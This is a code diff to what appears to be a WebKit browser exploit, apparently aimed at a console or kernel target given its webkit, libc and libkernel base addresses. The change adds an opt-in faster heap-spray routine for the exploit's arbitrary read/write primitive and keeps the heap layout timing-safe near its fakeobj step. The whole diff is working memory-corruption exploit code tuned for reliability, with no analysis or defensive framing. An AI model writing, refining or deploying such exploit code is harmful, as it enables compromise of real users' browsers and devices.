@@ -2,6 +2,12 @@
 const fn = {};
 const structs = new Map();
 
+// 16 KiB of lo/hi pairs for the optional vectorised ARW fill. It is allocated
+// at script load only when ?spray=fast was set before this file loaded, so the
+// default stable path keeps exactly the same heap baseline. Fast mode allocates
+// it before the 4 MiB spray buffers, outside the critical fakeobj window.
+const ARW_SPRAY_PATTERN = globalThis.WOBKOT_FAST_SPRAY ? new Uint32Array(0x1000) : null;
+
 let webkit_base = undefined;
 let libc_base = undefined;
 let libkernel_base = undefined;
@@ -125,9 +131,24 @@ const arw = {
         const spray_1_u32 = new Uint32Array(spray[1]);
         const spray_2_u32 = new Uint32Array(spray[2]);
 
-        for (let j = 0; j < spray_1_u32.length; j += 2) {
-          spray_1_u32[j] = addr.lo;
-          spray_1_u32[j + 1] = addr.hi;
+        if (globalThis.WOBKOT_FAST_SPRAY) {
+          // Same bytes as the original loop, written with native set() copies.
+          // Opt-in only: the ARW is heap and timing sensitive, so the stable
+          // loop stays the default until this path has a hardware record.
+          const pattern = ARW_SPRAY_PATTERN;
+          if (!pattern) throw new Error('fast spray pattern was not allocated');
+          for (let i = 0; i < pattern.length; i += 2) {
+            pattern[i] = addr.lo;
+            pattern[i + 1] = addr.hi;
+          }
+          for (let off = 0; off < spray_1_u32.length; off += pattern.length) {
+            spray_1_u32.set(pattern, off);
+          }
+        } else {
+          for (let j = 0; j < spray_1_u32.length; j += 2) {
+            spray_1_u32[j] = addr.lo;
+            spray_1_u32[j + 1] = addr.hi;
+          }
         }
 
         spray_2_u32.set(spray_1_u32);
